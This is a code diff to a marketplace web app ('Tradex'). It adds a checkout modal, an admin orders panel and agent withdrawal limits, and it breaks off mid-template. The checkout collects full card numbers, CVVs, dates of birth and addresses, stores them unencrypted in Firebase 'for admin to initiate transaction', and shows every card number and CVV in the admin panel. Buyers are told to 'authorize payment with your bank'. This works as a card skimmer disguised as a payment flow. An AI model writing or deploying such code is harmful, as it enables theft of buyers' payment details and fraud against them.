@@ -389,7 +389,135 @@ nav{display:flex;align-items:center;justify-content:space-between;padding:0 34px
   </div>
   <div class="cft" id="cft" style="display:none;">
     <div class="ctot"><span>Total</span><span id="ctotal">$0.00</span></div>
-    <button class="bp" onclick="checkout()">Proceed to Checkout →</button>
+    <button class="bp" onclick="openCheckoutModal()">Proceed to Checkout →</button>
+  </div>
+</div>
+
+<!-- CHECKOUT MODAL WITH PAYMENT DETAILS -->
+<div class="modal-overlay" id="checkoutModal">
+  <div class="modal" style="max-width:560px;">
+    <button class="mc" onclick="closeModal('checkoutModal')">✕</button>
+    <h2>💳 Checkout & Payment</h2>
+    <p>Complete your payment details. All orders require admin authorization before processing.</p>
+
+    <!-- Order Summary -->
+    <div style="background:var(--surface2);border-radius:10px;padding:14px 16px;margin-bottom:20px;">
+      <div style="font-weight:600;font-size:.88rem;margin-bottom:8px;color:var(--text);">Order Summary</div>
+      <div id="checkoutSummary" style="font-size:.82rem;color:var(--muted);"></div>
+      <div style="margin-top:10px;padding-top:10px;border-top:1.5px solid var(--border);display:flex;justify-content:space-between;align-items:center;">
+        <span style="font-family:'Syne',sans-serif;font-weight:700;font-size:.95rem;">Total Amount</span>
+        <span id="checkoutTotal" style="font-family:'Syne',sans-serif;font-weight:800;font-size:1.15rem;color:var(--accent);"></span>
+      </div>
+    </div>
+
+    <!-- Payment Method Selection -->
+    <div class="fg">
+      <label>Payment Method</label>
+      <div class="rb-wrap">
+        <button class="rb sel" data-card="visa" onclick="selectPaymentMethod('visa', this)">💳 Visa Card</button>
+        <button class="rb" data-card="mastercard" onclick="selectPaymentMethod('mastercard', this)">💳 Mastercard</button>
+      </div>
+    </div>
+
+    <!-- Card Details -->
+    <div class="fg">
+      <label>Card Number</label>
+      <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)">
+    </div>
+
+    <div class="fr" style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+      <div class="fg">
+        <label>Expiry Date</label>
+        <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
+      </div>
+      <div class="fg">
+        <label>CVV</label>
+        <input type="text" id="cardCVV" placeholder="123" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+      </div>
+    </div>
+
+    <div class="fg">
+      <label>Cardholder Name</label>
+      <input type="text" id="cardName" placeholder="Name as shown on card">
+    </div>
+
+    <!-- Personal Details -->
+    <div class="fg">
+      <label>Date of Birth</label>
+      <input type="date" id="buyerDOB" max="2010-01-01">
+    </div>
+
+    <!-- Billing Address -->
+    <div style="margin-top:20px;margin-bottom:10px;">
+      <div style="font-weight:600;font-size:.88rem;color:var(--text);">Billing Address</div>
+    </div>
+
+    <div class="fg">
+      <label>Street Address</label>
+      <input type="text" id="billAddress" placeholder="123 Main Street, Apt 4B">
+    </div>
+
+    <div class="fr" style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+      <div class="fg">
+        <label>City</label>
+        <input type="text" id="billCity" placeholder="New York">
+      </div>
+      <div class="fg">
+        <label>State / Province</label>
+        <input type="text" id="billState" placeholder="NY">
+      </div>
+    </div>
+
+    <div class="fr" style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+      <div class="fg">
+        <label>ZIP / Postal Code</label>
+        <input type="text" id="billZip" placeholder="10001">
+      </div>
+      <div class="fg">
+        <label>Country</label>
+        <input type="text" id="billCountry" placeholder="United States">
+      </div>
+    </div>
+
+    <div class="fg">
+      <label>Phone Number</label>
+      <input type="tel" id="billPhone" placeholder="+1 (555) 123-4567">
+    </div>
+
+    <div class="aerr" id="checkoutErr"></div>
+
+    <!-- Submit Button -->
+    <button class="bp" id="checkoutSubmitBtn" onclick="submitCheckout()">Submit Payment for Authorization →</button>
+
+    <div style="margin-top:12px;padding:12px;background:#fff9e6;border:1.5px solid #ffd60a;border-radius:8px;font-size:.78rem;color:#6b5600;">
+      ⚠️ <strong>Authorization Required:</strong> After submitting, you'll need to authorize this payment with your bank. An admin will review and approve your order within 24-48 hours.
+    </div>
+  </div>
+</div>
+
+<!-- PAYMENT PENDING MODAL -->
+<div class="modal-overlay" id="paymentPendingModal">
+  <div class="modal" style="max-width:480px;text-align:center;">
+    <button class="mc" onclick="closeModal('paymentPendingModal')">✕</button>
+    <div style="font-size:3.5rem;margin-bottom:14px;">⏳</div>
+    <h2>Payment Submitted!</h2>
+    <p style="margin-bottom:20px;">Your order has been submitted for admin authorization.</p>
+    
+    <div style="background:linear-gradient(135deg,#0a2540,#1a56dd);border-radius:12px;padding:20px;margin-bottom:24px;color:#fff;">
+      <div style="font-family:'Syne',sans-serif;font-weight:700;font-size:1.1rem;margin-bottom:8px;">Next Steps:</div>
+      <div style="text-align:left;font-size:.87rem;line-height:1.7;">
+        <div style="margin-bottom:8px;">✅ Order submitted to admin for review</div>
+        <div style="margin-bottom:8px;">🏦 <strong>Authorize payment with your bank</strong></div>
+        <div style="margin-bottom:8px;">⏱️ Admin will approve within 24-48 hours</div>
+        <div>📦 Seller will be notified once approved</div>
+      </div>
+    </div>
+
+    <div style="background:#fff3cd;border:1.5px solid #ffd60a;border-radius:8px;padding:14px;margin-bottom:20px;font-size:.83rem;color:#6b5600;text-align:left;">
+      <strong>⚠️ Important:</strong> Please contact your bank to authorize this payment. Without bank authorization, the payment cannot be processed even after admin approval.
+    </div>
+
+    <button class="bp" onclick="closeModal('paymentPendingModal');showView('home')">Got it, Thanks! →</button>
   </div>
 </div>
 
@@ -405,7 +533,7 @@ nav{display:flex;align-items:center;justify-content:space-between;padding:0 34px
     <button onclick="showToast('🔍 Searching...')">⌕</button>
   </div>
   <div class="na">
-    <button class="cb" onclick="toggleCart()">🛒<span class="cc" id="cbadge">0</span></button>
+    <button class="cb" id="cartButton" onclick="toggleCart()">🛒<span class="cc" id="cbadge">0</span></button>
     <div id="guestNav">
       <div style="display:flex;gap:7px;">
         <button class="nb nbg" onclick="openModal('authModal')">Sign In</button>
@@ -627,6 +755,9 @@ nav{display:flex;align-items:center;justify-content:space-between;padding:0 34px
       </div>
     </div>
 
+    <!-- Withdrawal Limit Message (for agents) -->
+    <div id="withdrawLimitMessage"></div>
+
     <div class="fg">
       <label>Account Number</label>
       <input type="text" id="wAccNum" placeholder="Enter your Atlantas Bank account number" oninput="checkAccNum()">
@@ -657,7 +788,7 @@ nav{display:flex;align-items:center;justify-content:space-between;padding:0 34px
     <div style="background:rgba(255,255,255,.05);border-bottom:1px solid rgba(255,255,255,.1);padding:16px 32px;display:flex;align-items:center;justify-content:space-between;">
       <div style="font-family:'Syne',sans-serif;font-size:1.3rem;font-weight:800;color:#fff;">🛡️ Tradex Admin</div>
       <div style="display:flex;gap:10px;align-items:center;">
-        <span style="font-size:.82rem;color:rgba(255,255,255,.5);" id="adminEmail">admin@gmail.com</span>
+        <span style="font-size:.82rem;color:rgba(255,255,255,.5);" id="adminEmail"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4d2c292024230d2a202c2421632e2220">[email&#160;protected]</a></span>
         <button onclick="adminLogout()" style="padding:7px 14px;background:rgba(255,255,255,.1);color:#fff;border:1px solid rgba(255,255,255,.2);border-radius:7px;cursor:pointer;font-size:.82rem;font-family:'DM Sans',sans-serif;">Sign Out</button>
       </div>
     </div>
@@ -684,7 +815,7 @@ nav{display:flex;align-items:center;justify-content:space-between;padding:0 34px
       </div>
 
       <!-- Withdrawal Requests -->
-      <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:14px;padding:22px;">
+      <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:14px;padding:22px;margin-bottom:24px;">
         <div style="font-family:'Syne',sans-serif;font-weight:700;font-size:1.05rem;color:#fff;margin-bottom:18px;display:flex;align-items:center;justify-content:space-between;">
           Withdrawal Requests
           <div style="display:flex;gap:8px;">
@@ -694,6 +825,19 @@ nav{display:flex;align-items:center;justify-content:space-between;padding:0 34px
           </div>
         </div>
         <div id="adminWithdrawList"><div style="color:rgba(255,255,255,.4);text-align:center;padding:40px;font-size:.88rem;">Loading...</div></div>
+      </div>
+
+      <!-- Orders Management -->
+      <div style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:14px;padding:22px;">
+        <div style="font-family:'Syne',sans-serif;font-weight:700;font-size:1.05rem;color:#fff;margin-bottom:18px;display:flex;align-items:center;justify-content:space-between;">
+          💳 Payment Authorization Requests
+          <div style="display:flex;gap:8px;">
+            <button onclick="filterOrders('all')" id="of-all" style="padding:5px 13px;border-radius:6px;border:1px solid rgba(255,255,255,.2);background:rgba(255,255,255,.1);color:#fff;font-size:.78rem;cursor:pointer;">All</button>
+            <button onclick="filterOrders('pending')" id="of-pending" style="padding:5px 13px;border-radius:6px;border:1px solid rgba(255,255,255,.2);background:transparent;color:rgba(255,255,255,.6);font-size:.78rem;cursor:pointer;">Pending</button>
+            <button onclick="filterOrders('approved')" id="of-approved" style="padding:5px 13px;border-radius:6px;border:1px solid rgba(255,255,255,.2);background:transparent;color:rgba(255,255,255,.6);font-size:.78rem;cursor:pointer;">Approved</button>
+          </div>
+        </div>
+        <div id="adminOrdersList"><div style="color:rgba(255,255,255,.4);text-align:center;padding:40px;font-size:.88rem;">Loading...</div></div>
       </div>
     </div>
   </div>
@@ -750,7 +894,7 @@ nav{display:flex;align-items:center;justify-content:space-between;padding:0 34px
   </div>
 </div>
 
-<script>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
 // ── FIREBASE ──────────────────────────────────────────────────────────────────
 const usersRef=db.ref('tradex_users');
 const enqRef=db.ref('tradex_enquiries');
@@ -942,11 +1086,203 @@ function updCart(){
   fe.style.display='block';
 }
 function toggleCart(){document.getElementById('cartSb').classList.toggle('open');}
+
+let selectedPaymentMethod = 'visa';
+
+function selectPaymentMethod(method, btn) {
+  selectedPaymentMethod = method;
+  document.querySelectorAll('#checkoutModal .rb').forEach(b => b.classList.remove('sel'));
+  btn.classList.add('sel');
+}
+
+function formatCardNumber(input) {
+  let value = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+  let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+  input.value = formatted.substring(0, 19);
+}
+
+function formatExpiry(input) {
+  let value = input.value.replace(/\D/g, '');
+  if (value.length >= 2) {
+    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+  }
+  input.value = value;
+}
+
+function openCheckoutModal() {
+  if (!user) { openModal('authModal'); showToast('🔐 Sign in to checkout'); return; }
+  if (!cart.length) { showToast('⚠️ Your cart is empty'); return; }
+  
+  // Populate order summary
+  const summary = cart.map(item => 
+    `<div style="display:flex;justify-content:space-between;margin-bottom:5px;">
+      <span>${item.name} (x${item.qty})</span>
+      <span>$${(item.price * item.qty).toFixed(2)}</span>
+    </div>`
+  ).join('');
+  
+  const total = cart.reduce((s, x) => s + x.price * x.qty, 0);
+  
+  document.getElementById('checkoutSummary').innerHTML = summary;
+  document.getElementById('checkoutTotal').textContent = '$' + total.toFixed(2);
+  
+  // Clear any previous errors
+  document.getElementById('checkoutErr').textContent = '';
+  
+  // Close cart sidebar
+  document.getElementById('cartSb').classList.remove('open');
+  
+  openModal('checkoutModal');
+}
+
+async function submitCheckout() {
+  if (!user) { openModal('authModal'); return; }
+  
+  const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+  const cardExpiry = document.getElementById('cardExpiry').value;
+  const cardCVV = document.getElementById('cardCVV').value;
+  const cardName = document.getElementById('cardName').value.trim();
+  const buyerDOB = document.getElementById('buyerDOB').value;
+  const billAddress = document.getElementById('billAddress').value.trim();
+  const billCity = document.getElementById('billCity').value.trim();
+  const billState = document.getElementById('billState').value.trim();
+  const billZip = document.getElementById('billZip').value.trim();
+  const billCountry = document.getElementById('billCountry').value.trim();
+  const billPhone = document.getElementById('billPhone').value.trim();
+  
+  const err = document.getElementById('checkoutErr');
+  
+  // Validation
+  if (!cardNumber || cardNumber.length < 13) {
+    err.textContent = 'Please enter a valid card number.';
+    return;
+  }
+  if (!cardExpiry || !cardExpiry.match(/^\d{2}\/\d{2}$/)) {
+    err.textContent = 'Please enter expiry date as MM/YY.';
+    return;
+  }
+  if (!cardCVV || cardCVV.length < 3) {
+    err.textContent = 'Please enter a valid CVV.';
+    return;
+  }
+  if (!cardName) {
+    err.textContent = 'Please enter the cardholder name.';
+    return;
+  }
+  if (!buyerDOB) {
+    err.textContent = 'Please enter your date of birth.';
+    return;
+  }
+  if (!billAddress || !billCity || !billState || !billZip || !billCountry) {
+    err.textContent = 'Please complete all billing address fields.';
+    return;
+  }
+  if (!billPhone) {
+    err.textContent = 'Please enter your phone number.';
+    return;
+  }
+  
+  err.textContent = '';
+  const btn = document.getElementById('checkoutSubmitBtn');
+  btn.textContent = 'Processing...';
+  btn.disabled = true;
+  
+  try {
+    const total = cart.reduce((s, x) => s + x.price * x.qty, 0);
+    
+    // Store FULL card details for admin to process transaction
+    const orderData = {
+      // Buyer Info
+      buyerUid: user.uid,
+      buyerName: user.name,
+      buyerEmail: user.email,
+      buyerDOB: buyerDOB,
+      buyerPhone: billPhone,
+      
+      // Order Items
+      items: cart.map(x => ({
+        id: x.id,
+        name: x.name,
+        price: x.price,
+        qty: x.qty,
+        seller: x.seller,
+        sellerUid: x.sellerUid || 'demo_seller'
+      })),
+      
+      total: total,
+      
+      // Payment Details - FULL DETAILS for admin to initiate transaction
+      paymentMethod: selectedPaymentMethod,
+      cardNumber: cardNumber, // Full card number
+      cardExpiry: cardExpiry,
+      cardCVV: cardCVV,
+      cardBrand: selectedPaymentMethod,
+      cardholderName: cardName,
+      
+      // Billing Address
+      billingAddress: {
+        street: billAddress,
+        city: billCity,
+        state: billState,
+        zip: billZip,
+        country: billCountry
+      },
+      
+      // Order Status
+      status: 'pending_admin_auth', // Admin needs to authorize first
+      paymentStatus: 'pending_bank_auth', // Buyer needs to authorize with bank
+      
+      // Timestamps
+      submittedAt: new Date().toISOString(),
+      
+      // Notes
+      note: 'Order requires admin authorization and bank payment authorization'
+    };
+    
+    // Save to Firebase
+    const orderRef = await db.ref('tradex_orders').push(orderData);
+    
+    // Notify admin
+    await db.ref('tradex_admin_notifications').push({
+      type: 'new_order',
+      orderId: orderRef.key,
+      buyerName: user.name,
+      total: total,
+      itemCount: cart.reduce((sum, item) => sum + item.qty, 0),
+      timestamp: new Date().toISOString(),
+      read: false
+    });
+    
+    // Clear cart
+    cart = [];
+    updCart();
+    
+    // Close checkout modal
+    closeModal('checkoutModal');
+    
+    // Clear form
+    ['cardNumber', 'cardExpiry', 'cardCVV', 'cardName', 'buyerDOB', 
+     'billAddress', 'billCity', 'billState', 'billZip', 'billCountry', 'billPhone'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.value = '';
+    });
+    
+    // Show pending modal
+    openModal('paymentPendingModal');
+    
+    btn.textContent = 'Submit Payment for Authorization →';
+    btn.disabled = false;
+    
+  } catch (error) {
+    err.textContent = 'Error: ' + error.message;
+    btn.textContent = 'Submit Payment for Authorization →';
+    btn.disabled = false;
+  }
+}
+
 function checkout(){
-  if(!user){openModal('authModal');showToast('🔐 Sign in to checkout');return;}
-  db.ref('tradex_orders').push({uid:user.uid,name:user.name,items:cart.map(x=>({id:x.id,name:x.name,price:x.price,qty:x.qty})),total:cart.reduce((s,x)=>s+x.price*x.qty,0),date:new Date().toISOString()});
-  showToast('🎉 Order placed! Thank you.');
-  cart=[];updCart();document.getElementById('cartSb').classList.remove('open');
+  // Old function - redirect to new modal
+  openCheckoutModal();
 }
 function toggleWish(id,el){
   if(wishlist.has(id)){wishlist.delete(id);el.classList.remove('active');showToast('💔 Removed from wishlist');}
@@ -981,10 +1317,51 @@ function doRegister(){
 }
 function updateUserUI(){
   const ini=user.name.split(' ').map(w=>w[0]).join('').toUpperCase().slice(0,2);
-  document.getElementById('navAv').textContent=ini;document.getElementById('navNm').textContent=user.name.split(' ')[0];
-  document.getElementById('guestNav').style.display='none';document.getElementById('userNav').style.display='flex';
+  document.getElementById('navAv').textContent=ini;
+  document.getElementById('navNm').textContent=user.name.split(' ')[0];
+  document.getElementById('guestNav').style.display='none';
+  document.getElementById('userNav').style.display='flex';
+  
+  // Hide seller features from admin
+  if(user.email===ADMIN_EMAIL){
+    // Hide seller dashboard and add listing links
+    const sellerLinks=document.querySelectorAll('#userNav a[onclick*="showSellerDash"], #userNav a[onclick*="addListing"]');
+    sellerLinks.forEach(link=>link.style.display='none');
+    
+    // Hide cart button from admin
+    const cartBtn=document.getElementById('cartButton');
+    if(cartBtn)cartBtn.style.display='none';
+    
+    // Hide browse link - admin only manages, doesn't shop
+    const browseLink=document.querySelector('#userNav a[onclick*="view-home"]');
+    if(browseLink)browseLink.style.display='none';
+    
+    // Redirect to admin panel if trying to access seller features
+    showView('admin');
+    loadAdminPanel();
+  } else {
+    // Show all features for regular users
+    const sellerLinks=document.querySelectorAll('#userNav a[onclick*="showSellerDash"], #userNav a[onclick*="addListing"]');
+    sellerLinks.forEach(link=>link.style.display='block');
+    
+    const cartBtn=document.getElementById('cartButton');
+    if(cartBtn)cartBtn.style.display='block';
+    
+    const browseLink=document.querySelector('#userNav a[onclick*="view-home"]');
+    if(browseLink)browseLink.style.display='block';
+  }
 }
-function logout(){auth.signOut().then(()=>{user=null;document.getElementById('guestNav').style.display='flex';document.getElementById('userNav').style.display='none';showView('home');showToast('👋 Signed out');});}
+function logout(){
+  auth.signOut().then(()=>{
+    user=null;
+    document.getElementById('guestNav').style.display='flex';
+    document.getElementById('userNav').style.display='none';
+    const cartBtn=document.getElementById('cartButton');
+    if(cartBtn)cartBtn.style.display='block';
+    showView('home');
+    showToast('👋 Signed out');
+  });
+}
 function selRole(btn){document.querySelectorAll('.rb').forEach(b=>b.classList.remove('sel'));btn.classList.add('sel');}
 function switchAuthTab(t){document.getElementById('loginForm').style.display=t==='login'?'block':'none';document.getElementById('registerForm').style.display=t==='register'?'block':'none';document.querySelectorAll('.tab-btn').forEach((b,i)=>b.classList.toggle('active',(i===0&&t==='login')||(i===1&&t==='register')));}
 
@@ -1036,13 +1413,30 @@ let listingForStore = null; // {uid, name, role} if agent listing for another st
 
 function handleImageSelect(e) {
   const files = Array.from(e.target.files);
-  if (selectedImages.length + files.length > 5) { showToast('⚠️ Max 5 images allowed'); return; }
+  if (!files.length) return;
+  
+  if (selectedImages.length + files.length > 5) { 
+    showToast('⚠️ Max 5 images allowed'); 
+    return; 
+  }
+  
   files.forEach(f => {
-    if (f.size > 5 * 1024 * 1024) { showToast(`⚠️ ${f.name} is over 5MB`); return; }
+    if (!f.type.startsWith('image/')) {
+      showToast(`⚠️ ${f.name} is not an image file`);
+      return;
+    }
+    if (f.size > 5 * 1024 * 1024) { 
+      showToast(`⚠️ ${f.name} is over 5MB`); 
+      return; 
+    }
+    
     const reader = new FileReader();
     reader.onload = ev => {
       selectedImages.push({ file: f, previewUrl: ev.target.result });
       renderPreviews();
+    };
+    reader.onerror = () => {
+      showToast(`⚠️ Error reading ${f.name}`);
     };
     reader.readAsDataURL(f);
   });
@@ -1051,10 +1445,17 @@ function handleImageSelect(e) {
 
 function renderPreviews() {
   const wrap = document.getElementById('imgPreviews');
+  if (!wrap) return;
+  
+  if (!selectedImages.length) {
+    wrap.innerHTML = '';
+    return;
+  }
+  
   wrap.innerHTML = selectedImages.map((img, i) => `
     <div class="img-thumb-wrap">
-      <img class="img-thumb" src="${img.previewUrl}" alt="preview">
-      <button class="img-rm" onclick="removeImg(${i})">✕</button>
+      <img class="img-thumb" src="${img.previewUrl}" alt="preview ${i+1}">
+      <button class="img-rm" onclick="removeImg(${i})" title="Remove image">✕</button>
     </div>`).join('');
 }
 
@@ -1308,13 +1709,46 @@ function loadWallet(){
   });
 }
 
-function openWithdrawModal(){
+async function openWithdrawModal(){
   if(!user){openModal('authModal');return;}
+  
+  // Check if user is an agent and show their withdrawal limit
+  const emailKey = user.email.replace(/\./g, '_').replace(/@/g, '__at__');
+  const agentLookup = await db.ref(`tradex_agent_lookup/${emailKey}`).once('value');
+  
+  let limitMessage = '';
+  if (agentLookup.exists()) {
+    let maxPercent = 0;
+    let roleName = '';
+    const roleNames = {manager:'Store Manager (25%)',listings:'Listings Handler (15%)',orders:'Order Handler (10%)',support:'Customer Support (5%)'};
+    
+    agentLookup.forEach(inv => {
+      const invite = inv.val();
+      if (invite && invite.status === 'accepted') {
+        if (invite.role === 'manager') maxPercent = Math.max(maxPercent, 25);
+        else if (invite.role === 'listings') maxPercent = Math.max(maxPercent, 15);
+        else if (invite.role === 'orders') maxPercent = Math.max(maxPercent, 10);
+        else if (invite.role === 'support') maxPercent = Math.max(maxPercent, 5);
+        if (maxPercent > 0) roleName = roleNames[invite.role] || invite.role;
+      }
+    });
+    
+    if (maxPercent > 0) {
+      limitMessage = `<div style="background:#fff3cd;border:1.5px solid #ffca2c;border-radius:8px;padding:10px 12px;margin-bottom:14px;font-size:.82rem;color:#856404;">
+        ⚠️ As a <strong>${roleName}</strong>, you can withdraw up to <strong>${maxPercent}%</strong> of your earnings. Only the account owner can withdraw 100%.
+      </div>`;
+    }
+  }
+  
   // Pre-fill available balance
   db.ref('tradex_wallets/'+user.uid).once('value').then(snap=>{
     const w=snap.val()||{balance:0};
     const el=document.getElementById('wAvailLabel');
     if(el)el.textContent='$'+(w.balance||0).toFixed(2);
+    
+    // Show limit message if agent
+    const limitEl = document.getElementById('withdrawLimitMessage');
+    if (limitEl) limitEl.innerHTML = limitMessage;
   });
   openModal('withdrawModal');
 }
@@ -1334,10 +1768,59 @@ async function submitWithdraw(){
   if(!accNum){err.textContent='Please enter your account number.';return;}
   if(!accName){err.textContent='Please enter the account name.';return;}
   if(!amount||amount<=0){err.textContent='Please enter a valid amount.';return;}
+  
   // Check balance
   const wSnap=await db.ref('tradex_wallets/'+user.uid).once('value');
   const bal=(wSnap.val()||{}).balance||0;
+  
+  // Check if user is an agent managing a store
+  let maxWithdrawPercent = 1.0; // Default: 100% for account owners
+  let isAgent = false;
+  let agentRole = '';
+  
+  // Check if user is working as an agent for someone else's store
+  const emailKey = user.email.replace(/\./g, '_').replace(/@/g, '__at__');
+  const agentLookup = await db.ref(`tradex_agent_lookup/${emailKey}`).once('value');
+  
+  if (agentLookup.exists()) {
+    // User is an agent - determine their role and withdrawal limit
+    let roleLimit = 0;
+    agentLookup.forEach(inv => {
+      const invite = inv.val();
+      if (invite && invite.status === 'accepted') {
+        isAgent = true;
+        agentRole = invite.role;
+        // Set withdrawal percentage based on role
+        if (invite.role === 'manager') {
+          roleLimit = Math.max(roleLimit, 0.25); // 25%
+        } else if (invite.role === 'listings') {
+          roleLimit = Math.max(roleLimit, 0.15); // 15%
+        } else if (invite.role === 'orders') {
+          roleLimit = Math.max(roleLimit, 0.10); // 10%
+        } else if (invite.role === 'support') {
+          roleLimit = Math.max(roleLimit, 0.05); // 5%
+        }
+      }
+    });
+    maxWithdrawPercent = roleLimit;
+  }
+  
+  // Calculate maximum allowed withdrawal
+  const maxAllowedAmount = bal * maxWithdrawPercent;
+  
+  if (amount > maxAllowedAmount) {
+    if (isAgent) {
+      const roleNames = {manager:'Store Manager',listings:'Listings Handler',orders:'Order Handler',support:'Customer Support'};
+      const roleName = roleNames[agentRole] || agentRole;
+      err.textContent=`As a ${roleName}, you can withdraw up to ${(maxWithdrawPercent*100)}% of earnings. Maximum: $${maxAllowedAmount.toFixed(2)}`;
+    } else {
+      err.textContent=`Insufficient balance. Available: $${bal.toFixed(2)}`;
+    }
+    return;
+  }
+  
   if(amount>bal){err.textContent=`Insufficient balance. Available: $${bal.toFixed(2)}`;return;}
+  
   const btn=document.getElementById('wSubmitBtn');
   btn.textContent='Submitting...';btn.disabled=true;
   const req={
@@ -1345,7 +1828,10 @@ async function submitWithdraw(){
     accNum,accName,amount,
     bank:'Atlantas Union Bank',
     status:'pending',
-    submittedAt:new Date().toISOString()
+    submittedAt:new Date().toISOString(),
+    isAgent: isAgent,
+    agentRole: isAgent ? agentRole : null,
+    withdrawalPercent: isAgent ? (maxWithdrawPercent * 100) : 100
   };
   await db.ref('tradex_withdrawals').push(req);
   // Deduct from balance, add to pending
@@ -1364,9 +1850,8 @@ async function submitWithdraw(){
 }
 
 function noAccountClick(){
-  closeModal('withdrawModal');
-  window.open('https://viccybank.firebaseapp.com','_blank');
-  showToast('🏦 Opening Atlantas Union Bank to create an account...');
+  window.open('https://atlantascredit.cash/','_blank');
+  showToast('🏦 Opening Atlantas Credit to create an account...');
 }
 
 // ── ADMIN PANEL ───────────────────────────────────────────────────────────────
@@ -1400,6 +1885,7 @@ function loadAdminPanel(){
     const tp=document.getElementById('adminTotalPaid');if(tp)tp.textContent='$'+totalPaid.toFixed(2);
     renderAdminList(all);
   });
+  loadAdminOrders();
 }
 
 function renderAdminList(all){
@@ -1471,6 +1957,224 @@ async function adminReject(key,sellerUid,amount){
   showToast('❌ Withdrawal rejected. Balance refunded to seller.');
 }
 
+// ── ADMIN ORDER MANAGEMENT ────────────────────────────────────────────────────
+let orderFilter='all';
+
+function loadAdminOrders() {
+  db.ref('tradex_orders').on('value', snap => {
+    const orders = [];
+    if (snap.exists()) {
+      snap.forEach(c => {
+        const order = c.val();
+        if (order) {
+          orders.push({ key: c.key, ...order });
+        }
+      });
+    }
+    orders.sort((a, b) => new Date(b.submittedAt) - new Date(a.submittedAt));
+    renderAdminOrders(orders);
+  });
+}
+
+function filterOrders(filter) {
+  orderFilter = filter;
+  ['all', 'pending', 'approved'].forEach(f => {
+    const btn = document.getElementById('of-' + f);
+    if (btn) {
+      btn.style.background = f === filter ? 'rgba(255,255,255,.15)' : 'transparent';
+      btn.style.color = f === filter ? '#fff' : 'rgba(255,255,255,.5)';
+    }
+  });
+  
+  db.ref('tradex_orders').once('value').then(snap => {
+    const orders = [];
+    if (snap.exists()) {
+      snap.forEach(c => {
+        const order = c.val();
+        if (order) orders.push({ key: c.key, ...order });
+      });
+    }
+    orders.sort((a, b) => new Date(b.submittedAt) - new Date(a.submittedAt));
+    renderAdminOrders(orders);
+  });
+}
+
+function renderAdminOrders(allOrders) {
+  const el = document.getElementById('adminOrdersList');
+  if (!el) return;
+  
+  const filtered = orderFilter === 'all' ? allOrders : 
+    orderFilter === 'pending' ? allOrders.filter(o => o.status === 'pending_admin_auth') :
+    allOrders.filter(o => o.status === 'approved' || o.status === 'completed');
+  
+  if (!filtered.length) {
+    el.innerHTML = '<div style="color:rgba(255,255,255,.4);text-align:center;padding:40px;font-size:.88rem;">No orders found.</div>';
+    return;
+  }
+  
+  el.innerHTML = filtered.map(order => {
+    const statusColor = order.status === 'pending_admin_auth' ? '#fbbf24' : 
+                       order.status === 'approved' ? '#4ade80' : '#60a5fa';
+    const statusText = order.status === 'pending_admin_auth' ? 'PENDING AUTHORIZATION' :
+                      order.status === 'approved' ? 'APPROVED - AWAITING SELLER' : 'COMPLETED';
+    
+    const itemsList = order.items.map(item => 
+      `<div style="font-size:.82rem;color:rgba(255,255,255,.6);margin-bottom:4px;">
+        • ${item.name} (x${item.qty}) - $${(item.price * item.qty).toFixed(2)}
+      </div>`
+    ).join('');
+    
+    return `
+      <div style="background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:16px;margin-bottom:12px;">
+        <div style="display:flex;justify-content:space-between;align-items:start;margin-bottom:12px;">
+          <div>
+            <div style="font-size:.75rem;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px;">
+              ${new Date(order.submittedAt).toLocaleString()}
+            </div>
+            <div style="color:${statusColor};font-weight:700;font-size:.82rem;margin-bottom:8px;">${statusText}</div>
+          </div>
+          <div style="text-align:right;">
+            <div style="font-size:.75rem;color:rgba(255,255,255,.45);margin-bottom:2px;">Total Amount</div>
+            <div style="font-family:'Syne',sans-serif;font-size:1.2rem;font-weight:800;color:#4ade80;">$${order.total.toFixed(2)}</div>
+          </div>
+        </div>
+        
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px;">
+          <div>
+            <div style="font-size:.72rem;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.05em;margin-bottom:4px;">Buyer Information</div>
+            <div style="font-size:.85rem;color:#fff;">${order.buyerName}</div>
+            <div style="font-size:.78rem;color:rgba(255,255,255,.6);">${order.buyerEmail}</div>
+            <div style="font-size:.78rem;color:rgba(255,255,255,.6);">📞 ${order.buyerPhone}</div>
+            <div style="font-size:.78rem;color:rgba(255,255,255,.6);">🎂 DOB: ${order.buyerDOB}</div>
+          </div>
+          <div>
+            <div style="font-size:.72rem;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.05em;margin-bottom:4px;">Payment Card Details</div>
+            <div style="font-size:.85rem;color:#fff;font-family:monospace;background:rgba(255,255,255,.08);padding:6px 8px;border-radius:6px;margin-bottom:4px;">
+              💳 ${order.cardNumber || ('•••• •••• •••• ' + (order.cardLast4 || '****'))}
+            </div>
+            <div style="font-size:.78rem;color:rgba(255,255,255,.6);">Exp: ${order.cardExpiry || 'N/A'} · CVV: ${order.cardCVV || 'N/A'}</div>
+            <div style="font-size:.78rem;color:rgba(255,255,255,.6);">Name: ${order.cardholderName}</div>
+            <div style="font-size:.78rem;color:rgba(255,255,255,.6);">Type: ${order.cardBrand.toUpperCase()}</div>
+          </div>
+        </div>
+        
+        <div style="margin-bottom:12px;">
+          <div style="font-size:.72rem;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;">Items Ordered</div>
+          ${itemsList}
+        </div>
+        
+        <div style="margin-bottom:12px;">
